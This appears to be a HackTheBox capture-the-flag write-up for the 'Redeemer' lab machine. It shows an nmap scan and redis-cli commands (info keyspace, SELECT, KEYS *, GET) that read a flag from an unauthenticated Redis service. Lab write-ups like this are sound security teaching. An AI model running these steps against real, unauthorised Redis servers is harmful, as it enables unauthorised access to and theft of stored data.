# HTB - Redeemer

**Difficulty:** Very Easy  
**Category:** Redis  
**Date:** 2026  
**Status:** ✅ Completed

---

## Summary

Redeemer is a Linux machine running an exposed Redis instance with no authentication required. By connecting directly to the Redis service and enumerating the databases, it is possible to retrieve the flag stored as a key-value pair.

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.x.x
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 6379 | redis | Redis key-value store |

Port **6379** is open, which is the default Redis port.

---

## Exploitation

### Step 1 - Connect to Redis

Used **redis-cli** to connect to the target with no password:

```bash
redis-cli -h 10.129.x.x
```

**Output:**
```
10.129.x.x:6379>
```

Connection was successful with no authentication required.

### Step 2 - Enumerate Databases

Checked server information to find available databases:

```bash
info keyspace
```

**Output:**
```
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

Found 4 keys in database 0.

### Step 3 - List All Keys

Selected database 0 and listed all keys:

```bash
SELECT 0
KEYS *
```

**Output:**
```
1) "numb"
2) "stor"
3) "temp"
4) "flag"
```

Found a key called **flag**!

### Step 4 - Retrieve the Flag

```bash
GET flag
```

**Output:**
```
HTB{...}
```

---



---

## What I Learned

- What Redis is and how it works as an in-memory database
- How to use **redis-cli** to connect to a Redis instance
- Redis commands: **info**, **SELECT**, **KEYS \***, **GET**
- That Redis can be exposed without authentication when misconfigured
- The importance of scanning all 65535 ports, not just the default 1000

---

## References

- [Redis - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
